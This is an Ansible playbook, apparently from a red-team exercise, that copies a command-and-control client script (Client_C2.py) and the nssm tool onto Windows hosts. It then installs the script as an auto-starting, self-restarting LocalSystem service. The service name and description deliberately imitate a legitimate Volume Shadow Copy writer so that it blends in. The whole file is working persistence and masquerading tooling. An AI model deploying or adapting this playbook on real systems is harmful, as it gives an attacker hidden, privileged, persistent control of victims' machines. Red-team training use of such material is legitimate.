---
# Matt Sisco

-   name: Deploy script as Service
    hosts: all
    vars:
      service_name: "VssWriterService" # Legit sounding Name of the service to be created
      service_display_name: "VssWriter Service" # Legit sounding Display name for the service
      service_directory: "C://Windows/Vss/Writers/VssWriter/"
      service_script: "{{ service_directory }}\\VssWriter.py"
      local_file: "/home/redteam/310Infragroup7nyameow/Matt_tool/c2_programs/Client_C2.py"
      nssm_exe: "{{ service_directory }}\\nssm.exe"
      local_nssm: "/home/redteam/310Infragroup7nyameow/Matt_tool/source/nssm1.exe"

    tasks:
      - name: Make sure the directory exists
        ansible.windows.win_file:
          path: "{{ service_directory }}"
          state: directory

      - name: Copy script over
        ansible.windows.win_copy:
          src: "{{ local_file }}"
          dest: "{{ service_script }}"

      - name: Copy nssm over
        ansible.windows.win_copy:
          src: "{{ local_nssm }}"
          dest: "{{ nssm_exe }}"

      - name: Stop service if running
        ansible.windows.win_service:
          name: "{{ service_name }}"
          state: stopped
        ignore_errors: true

      - name: Remove service if exists
        ansible.windows.win_shell: |
          & "{{ nssm_exe }}" remove "{{ service_name }}" confirm
        ignore_errors: true

      - name: Install service
        ansible.windows.win_shell: |
          & "{{ nssm_exe }}" install "{{ service_name }}" "python" "{{ service_script }}"
          & "{{ nssm_exe }}" set "{{ service_name }}" AppDirectory "{{ service_directory }}"
          & "{{ nssm_exe }}" set "{{ service_name }}" ObjectName "LocalSystem"
          & "{{ nssm_exe }}" set "{{ service_name }}" AppExit Default Restart
          & "{{ nssm_exe }}" set "{{ service_name }}" AppThrottle 5000  # 5-second delay
          & "{{ nssm_exe }}" set "{{ service_name }}" Description "VssWriter Service - Provides backup and restore capabilities for applications that use the Volume Shadow Copy Service (VSS)."
      - name: Set service to auto start
        ansible.windows.win_service:
          name: "{{ service_name }}"
          start_mode: auto

      - name: Start Service
        ansible.windows.win_service:
          name: "{{ service_name }}"
          state: started
